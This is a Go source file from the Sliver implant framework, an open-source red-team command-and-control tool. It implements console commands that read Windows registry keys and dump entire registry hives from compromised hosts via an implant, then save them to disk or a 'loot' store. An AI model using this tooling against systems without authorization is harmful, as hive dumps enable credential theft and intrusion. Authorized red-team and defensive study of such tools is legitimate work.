package registry

/*
	Sliver Implant Framework
	Copyright (C) 2021  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import (
	"context"
	"fmt"
	"os"
	"path/filepath"
	"strings"

	"google.golang.org/protobuf/proto"

	"github.com/spf13/cobra"

	"github.com/bishopfox/sliver/client/command/loot"
	"github.com/bishopfox/sliver/client/console"
	"github.com/bishopfox/sliver/protobuf/clientpb"
	"github.com/bishopfox/sliver/protobuf/sliverpb"
	"github.com/bishopfox/sliver/util/encoders"
)

var validHives = []string{
	"HKCU",
	"HKLM",
	"HKCC",
	"HKPD",
	"HKU",
	"HKCR",
}

// var validTypes = []string{
// 	"binary",
// 	"dword",
// 	"qword",
// 	"string",
// }

func checkHive(hive string) error {
	for _, h := range validHives {
		if h == hive {
			return nil
		}
	}
	return fmt.Errorf("invalid hive %s", hive)
}

func getType(t string) (uint32, error) {
	var res uint32
	switch t {
	case "binary":
		res = sliverpb.RegistryTypeBinary
	case "dword":
		res = sliverpb.RegistryTypeDWORD
	case "qword":
		res = sliverpb.RegistryTypeQWORD
	case "string":
		res = sliverpb.RegistryTypeString
	default:
		return res, fmt.Errorf("invalid type %s", t)
	}
	return res, nil
}

// RegReadCmd - Read a windows registry key: registry read --hostname aa.bc.local --hive HKCU "software\google\chrome\blbeacon\version"
func RegReadCmd(cmd *cobra.Command, con *console.SliverClient, args []string) {
	var (
		finalPath string
		key       string
	)
	session, beacon := con.ActiveTarget.GetInteractive()
	if session == nil && beacon == nil {
		return
	}
	targetOS := getOS(session, beacon)
	if targetOS != "windows" {
		con.PrintErrorf("Registry operations can only target Windows\n")
		return
	}

	hostname, _ := cmd.Flags().GetString("hostname")
	hive, _ := cmd.Flags().GetString("hive")
	hive = strings.ToUpper(hive)
	if err := checkHive(hive); err != nil {
		con.PrintErrorf("%s\n", err)
		return
	}

	regPath := args[0]
	if regPath == "" {
		con.PrintErrorf("You must provide a path")
		return
	}

	if strings.Contains(regPath, "/") {
		regPath = strings.ReplaceAll(regPath, "/", "\\")
	}
	pathBaseIdx := strings.LastIndex(regPath, `\`)
	if pathBaseIdx < 0 {
		con.PrintErrorf("invalid path: %s", regPath)
		return
	}
	if len(regPath) < pathBaseIdx+1 {
		con.PrintErrorf("invalid path: %s", regPath)
		return
	}
	finalPath = regPath[:pathBaseIdx]
	key = regPath[pathBaseIdx+1:]

	regRead, err := con.Rpc.RegistryRead(context.Background(), &sliverpb.RegistryReadReq{
		Hive:     hive,
		Path:     finalPath,
		Key:      key,
		Hostname: hostname,
		Request:  con.ActiveTarget.Request(cmd),
	})
	if err != nil {
		con.PrintErrorf("%s\n", err)
		return
	}

	if regRead.Response != nil && regRead.Response.Async {
		con.AddBeaconCallback(regRead.Response.TaskID, func(task *clientpb.BeaconTask) {
			err = proto.Unmarshal(task.Response, regRead)
			if err != nil {
				con.PrintErrorf("Failed to decode response %s\n", err)
				return
			}
			PrintRegRead(regRead, con)
		})
		con.PrintAsyncResponse(regRead.Response)
	} else {
		PrintRegRead(regRead, con)
	}
}

// PrintRegRead - Print the results of the registry read command
func PrintRegRead(regRead *sliverpb.RegistryRead, con *console.SliverClient) {
	if regRead.Response != nil && regRead.Response.Err != "" {
		con.PrintErrorf("%s\n", regRead.Response.Err)
		return
	}
	con.Println(regRead.Value)
}

func writeHiveDump(data []byte, encoder string, fileName string, saveLoot bool, lootName string, lootType string, lootFileName string, con *console.SliverClient) {
	var rawData []byte
	var err error

	if encoder == "gzip" {
		rawData, err = new(encoders.Gzip).Decode(data)
		if err != nil {
			con.PrintErrorf("Could not decode gzip data: %s\n", err)
			return
		}
	} else if encoder == "" {
		rawData = data
	} else {
		con.PrintErrorf("Cannot decode registry hive data: unknown encoder %s\n", encoder)
		return
	}

	if fileName != "" {
		err = os.WriteFile(fileName, rawData, 0600)
		if err != nil {
			con.PrintErrorf("Could not write registry hive data to %s: %s\n", fileName, err)
			// We are not going to return here because if the user wants to loot, we may still be able to do that.
		} else {
			con.PrintSuccessf("Successfully wrote hive data to %s\n", fileName)
		}
	}

	if saveLoot {
		fileType := loot.ValidateLootFileType(lootType, rawData)
		loot.LootBinary(rawData, lootName, lootFileName, fileType, con)
	}
}

func RegReadHiveCommand(cmd *cobra.Command, con *console.SliverClient, args []string) {
	session, beacon := con.ActiveTarget.GetInteractive()
	if session == nil && beacon == nil {
		return
	}
	targetOS := getOS(session, beacon)
	if targetOS != "windows" {
		con.PrintErrorf("Registry operations can only target Windows\n")
		return
	}

	rootHive, _ := cmd.Flags().GetString("hive")
	rootHive = strings.ToUpper(rootHive)
	if err := checkHive(rootHive); err != nil {
		con.PrintErrorf("%s\n", err)
		return
	}
	saveLoot, _ := cmd.Flags().GetBool("loot")
	outputFileName, _ := cmd.Flags().GetString("save")
	if outputFileName == "" && !saveLoot {
		con.PrintErrorf("You must provide an output file name")
		return
	}

	if len(args) == 0 || (len(args) > 0 && args[0] == "") {
		con.PrintErrorf("You must provide a registry hive to dump")
		return
	}
	requestedHive := args[0]

	lootName := ""
	lootType := ""
	lootFileName := ""
	if saveLoot {
		lootName, _ = cmd.Flags().GetString("name")
		lootType, _ = cmd.Flags().GetString("file-type")
		// Get implant name
		implantName := ""
		if session == nil {
			implantName = beacon.Name
		} else {
			implantName = session.Name
		}
		if lootName == "" {
			lootName = fmt.Sprintf("Registry hive %s\\%s on %s", rootHive, requestedHive, implantName)
		}
		if outputFileName != "" {
			lootFileName = filepath.Base(outputFileName)
		} else {
			requestedHiveForFileName := strings.ReplaceAll(requestedHive, "/", "_")
			requestedHiveForFileName = strings.ReplaceAll(requestedHiveForFileName, "\\", "_")
			lootFileName = fmt.Sprintf("%s_%s_%s", implantName, rootHive, requestedHiveForFileName)
		}
	}

	if strings.Contains(requestedHive, "/") {
		requestedHive = strings.ReplaceAll(requestedHive, "/", "\\")
	}

	hiveDump, err := con.Rpc.RegistryReadHive(context.Background(), &sliverpb.RegistryReadHiveReq{
		RootHive:      rootHive,
		RequestedHive: requestedHive,
		Request:       con.ActiveTarget.Request(cmd),
	})

	if err != nil {
		con.PrintErrorf("%s\n", err)
		return
	}

	if hiveDump.Response != nil && hiveDump.Response.Async {
		con.AddBeaconCallback(hiveDump.Response.TaskID, func(task *clientpb.BeaconTask) {
			err = proto.Unmarshal(task.Response, hiveDump)
			if err != nil {
				con.PrintErrorf("Failed to decode response %s\n", err)
				return
			}
			writeHiveDump(hiveDump.Data, hiveDump.Encoder, outputFileName, saveLoot, lootName, lootType, lootFileName, con)
		})
		con.PrintAsyncResponse(hiveDump.Response)
	} else {
		writeHiveDump(hiveDump.Data, hiveDump.Encoder, outputFileName, saveLoot, lootName, lootType, lootFileName, con)
	}
}
